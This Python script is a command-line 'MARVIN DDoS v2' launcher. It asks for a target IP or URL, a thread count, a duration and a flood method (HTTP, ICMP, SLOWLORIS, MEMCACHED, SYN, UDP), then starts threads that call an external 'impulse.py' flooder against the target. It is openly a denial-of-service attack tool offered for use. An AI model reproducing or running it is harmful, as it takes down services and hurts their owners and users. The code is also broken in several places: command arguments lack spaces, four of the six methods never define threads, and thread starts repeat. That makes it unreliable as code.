import os

# -------------------------------------------- 

try:
  import Colorama
except:
  print("Installing Dependency: Colorama")
  os.system("pip3.9 install colorama 1>/dev/null")

try:
  import time
except:
  print("Installing Dependency: Time")
  os.system("pip3.9 install time 1>/dev/null")

try:
  import time
except:
  print("Installing Dependency: Signal")
  os.system("pip3.9 install signal 1>/dev/null")

try:
  import time
except:
  print("Installing Dependency: Readchar")
  os.system("pip3.9 install readchar 1>/dev/null")

# --------------------------------------------
import threading
import time
import colorama
from colorama import Fore
from signal import signal, SIGINT
from sys import exit

os.system("clear")
time.sleep(1)
logo = """
  ███╗   ███╗ █████╗ ██████╗ ██╗   ██╗██╗███╗   ██╗
  ████╗ ████║██╔══██╗██╔══██╗██║   ██║██║████╗  ██║
  ██╔████╔██║███████║██████╔╝██║   ██║██║██╔██╗ ██║
  ██║╚██╔╝██║██╔══██║██╔══██╗╚██╗ ██╔╝██║██║╚██╗██║
  ██║ ╚═╝ ██║██║  ██║██║  ██║ ╚████╔╝ ██║██║ ╚████║
  ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚═╝  ╚═══╝
  DDoS v2                                               
"""

print(Fore.RED + logo + Fore.BLUE)

ip = input(Fore.CYAN+"  URL/IP : "+Fore.WHITE)

threadcount = input(Fore.CYAN+"How many threads (1-300): ")

count = input(Fore.CYAN+"  Multiplier(1-50): "+Fore.WHITE)

length = input(Fore.CYAN+"How long to hit (Seconds): ")

hitmethod = input(Fore.CYAN+"Method (HTTP, ICMP, SLOWLORIS, MEMCACHED, SYN, UDP): ")

def http():
  print("  Starting Thread!")
  os.system("python3.9 impulse.py --target "+ip+":80"+"--time"+length+"--threads"+threadcount+"--method HTTP")
  print(Fore.GREEN + "  Started "+threading.current_thread().name +"!")
def icmp():
  print("  Starting Thread!")
  os.system("python3.9 impulse.py --target "+ip+":80"+"--time"+length+"--threads"+threadcount+"--method ICMP")
  print(Fore.GREEN + "  Started "+threading.current_thread().name +"!")
def slowloris():
  print("  Starting Thread!")
  os.system("python3.9 impulse.py --target "+ip+":80"+"--time"+length+"--threads"+threadcount+"--method SLOWLORIS")
  print(Fore.GREEN + "  Started "+threading.current_thread().name +"!")
def memcached():
  print("  Starting Thread!")
  os.system("python3.9 impulse.py --target "+ip+":80"+"--time"+length+"--threads"+threadcount+"--method MEMCACHED")
  print(Fore.GREEN + "  Started "+threading.current_thread().name +"!")
def syn():
  print("  Starting Thread!")
  os.system("python3.9 impulse.py --target "+ip+":80"+"--time"+length+"--threads"+threadcount+"--method SYN")
  print(Fore.GREEN + "  Started "+threading.current_thread().name +"!")
def udp():
  print("  Starting Thread!")
  os.system("python3.9 impulse.py --target "+ip+":53"+"--time"+length+"--threads"+threadcount+"--method UDP")
  print(Fore.GREEN + "  Started "+threading.current_thread().name +"!")

yesno = input(Fore.RED+"  Start Attack On "+ip+" With "+count+"x Multiplier"+"? Y/N: ")

if yesno == "n":
  print(Fore.BLUE+"  Exiting...")
  time.sleep(2)
  os.system("clear")
  exit()

if yesno == "N":
  print(Fore.BLUE+"  Exiting...")
  time.sleep(2)
  os.system("clear")
  exit()

if hitmethod == "HTTP":
  t1 = threading.Thread(target=http)
  t2 = threading.Thread(target=http)
  t3 = threading.Thread(target=http)
  t4 = threading.Thread(target=http)
  t5 = threading.Thread(target=http)
  t6 = threading.Thread(target=http)
  t7 = threading.Thread(target=http)
  t8 = threading.Thread(target=http)
  t9 = threading.Thread(target=http)
  t10 = threading.Thread(target=http)
  t11 = threading.Thread(target=http)
  t12 = threading.Thread(target=http)
  t13 = threading.Thread(target=http)
  t14 = threading.Thread(target=http)
  t15 = threading.Thread(target=http)
  t16 = threading.Thread(target=http)
  t17 = threading.Thread(target=http)
  t18 = threading.Thread(target=http)
  t19 = threading.Thread(target=http)
  t20 = threading.Thread(target=http)
  t21 = threading.Thread(target=http)
  t22 = threading.Thread(target=http)
  t23 = threading.Thread(target=http)
  t24 = threading.Thread(target=http)
  t25 = threading.Thread(target=http)
  t26 = threading.Thread(target=http)
  t27 = threading.Thread(target=http)
  t28 = threading.Thread(target=http)
  t29 = threading.Thread(target=http)
  t30 = threading.Thread(target=http)
  t31= threading.Thread(target=http)
  t32 = threading.Thread(target=http)
  t33 = threading.Thread(target=http)
  t34 = threading.Thread(target=http)
  t35 = threading.Thread(target=http)
  t36 = threading.Thread(target=http)
  t37 = threading.Thread(target=http)
  t38 = threading.Thread(target=http)
  t39 = threading.Thread(target=http)
  t40 = threading.Thread(target=http)
  t41 = threading.Thread(target=http)
  t42 = threading.Thread(target=http)
  t43 = threading.Thread(target=http)
  t44 = threading.Thread(target=http)
  t45 = threading.Thread(target=http)
  t46 = threading.Thread(target=http)
  t47 = threading.Thread(target=http)
  t48 = threading.Thread(target=http)
  t49 = threading.Thread(target=http)
  t50 = threading.Thread(target=http)
if hitmethod == "ICMP":
  t1 = threading.Thread(target=icmp)
  t2 = threading.Thread(target=icmp)
  t3 = threading.Thread(target=icmp)
  t4 = threading.Thread(target=icmp)
  t5 = threading.Thread(target=icmp)
  t6 = threading.Thread(target=icmp)
  t7 = threading.Thread(target=icmp)
  t8 = threading.Thread(target=icmp)
  t9 = threading.Thread(target=icmp)
  t10 = threading.Thread(target=icmp)
  t11 = threading.Thread(target=icmp)
  t12 = threading.Thread(target=icmp)
  t13 = threading.Thread(target=icmp)
  t14 = threading.Thread(target=icmp)
  t15 = threading.Thread(target=icmp)
  t16 = threading.Thread(target=icmp)
  t17 = threading.Thread(target=icmp)
  t18 = threading.Thread(target=icmp)
  t19 = threading.Thread(target=icmp)
  t20 = threading.Thread(target=icmp)
  t21 = threading.Thread(target=icmp)
  t22 = threading.Thread(target=icmp)
  t23 = threading.Thread(target=icmp)
  t24 = threading.Thread(target=icmp)
  t25 = threading.Thread(target=icmp)
  t26 = threading.Thread(target=icmp)
  t27 = threading.Thread(target=icmp)
  t28 = threading.Thread(target=icmp)
  t29 = threading.Thread(target=icmp)
  t30 = threading.Thread(target=icmp)
  t31= threading.Thread(target=icmp)
  t32 = threading.Thread(target=icmp)
  t33 = threading.Thread(target=icmp)
  t34 = threading.Thread(target=icmp)
  t35 = threading.Thread(target=icmp)
  t36 = threading.Thread(target=icmp)
  t37 = threading.Thread(target=icmp)
  t38 = threading.Thread(target=icmp)
  t39 = threading.Thread(target=icmp)
  t40 = threading.Thread(target=icmp)
  t41 = threading.Thread(target=icmp)
  t42 = threading.Thread(target=icmp)
  t43 = threading.Thread(target=icmp)
  t44 = threading.Thread(target=icmp)
  t45 = threading.Thread(target=icmp)
  t46 = threading.Thread(target=icmp)
  t47 = threading.Thread(target=icmp)
  t48 = threading.Thread(target=icmp)
  t49 = threading.Thread(target=icmp)
  t50 = threading.Thread(target=icmp)

if count == "1":
  t1.start()
if count == "2":
  t1.start()
  t2.start()
if count == '3':
  t1.start()
  t2.start()
  t3.start()
if count == '4':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
if count == '5':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
if count == '6':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
if count == '7':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
if count == '8':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
if count == '9':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
if count == '10':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
if count == '11':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
if count == '12':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
if count == '13':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
if count == '14':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
if count == '15':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
if count == '16':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
if count == '17':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
if count == '18':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
if count == '19':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
if count == '20':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
if count == '21':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
if count == '22':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
if count == '23':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
if count == '24':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
if count == '25':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
if count == '26':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
if count == '27':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
if count == '28':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
if count == '29':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
if count == '30':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
if count == '31':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
if count == '32':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
if count == '33':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
if count == '34':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
if count == '35':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
if count == '36':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
if count == '37':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
if count == '38':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
  t38.start()
if count == '39':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
  t38.start()
  t39.start()
if count == '40':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
  t38.start()
  t39.start()
  t40.start()
if count == '41':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
  t38.start()
  t39.start()
  t40.start()
  t41.start()
if count == '42':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
  t38.start()
  t39.start()
  t40.start()
  t41.start()
  t42.start()
if count == '43':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
  t38.start()
  t39.start()
  t40.start()
  t41.start()
  t42.start()
  t43.start()
if count == '44':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
  t38.start()
  t39.start()
  t40.start()
  t41.start()
  t42.start()
  t43.start()
  t44.start()
if count == '45':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
  t38.start()
  t39.start()
  t40.start()
  t41.start()
  t42.start()
  t43.start()
  t44.start()
  t45.start()
if count == '46':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
  t38.start()
  t39.start()
  t40.start()
  t41.start()
  t42.start()
  t43.start()
  t44.start()
  t45.start()
  t46.start()
if count == '47':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
  t38.start()
  t39.start()
  t40.start()
  t41.start()
  t42.start()
  t43.start()
  t44.start()
  t45.start()
  t46.start()
  t47.start()
if count == '48':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
  t38.start()
  t39.start()
  t40.start()
  t41.start()
  t42.start()
  t43.start()
  t44.start()
  t45.start()
  t46.start()
  t47.start()
  t48.start()
if count == '49':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
  t38.start()
  t39.start()
  t40.start()
  t41.start()
  t42.start()
  t43.start()
  t44.start()
  t45.start()
  t46.start()
  t47.start()
  t48.start()
  t49.start()
if count == '50':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
  t38.start()
  t39.start()
  t40.start()
  t41.start()
  t42.start()
  t43.start()
  t44.start()
  t45.start()
  t46.start()
  t47.start()
  t48.start()
  t49.start()
  t50.start()
